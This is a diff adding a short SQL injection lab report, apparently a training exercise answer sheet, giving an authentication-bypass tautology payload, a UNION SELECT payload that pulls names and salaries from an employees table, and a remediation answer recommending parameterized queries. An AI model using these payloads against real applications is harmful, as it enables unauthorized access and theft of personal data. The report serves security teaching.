@@ -1,0 +1,18 @@
+==================================================
+SESSION 25: SQL INJECTION EXFILTRATION REPORT
+==================================================
+
+1. AUTHENTICATION BYPASS
+* Tautology Payload Used: ' OR 1=1 --
+
+2. DATABASE MAPPING (UNION ATTACK)
+* Number of Columns Discovered: 2
+* Table Name Discovered: employees
+
+3. DATA EXFILTRATION
+* CEO Salary Extracted: 250000
+* Final UNION Payload Used: ' UNION SELECT name, salary FROM employees --
+
+4. REMEDIATION
+* What is the primary defense against this attack?
+Answer: The primary defense is using parameterized queries (prepared statements), which ensure user input is treated as data, not executable SQL. Additional protections include input validation, least-privilege database access, and suppressing detailed SQL error messages in production.
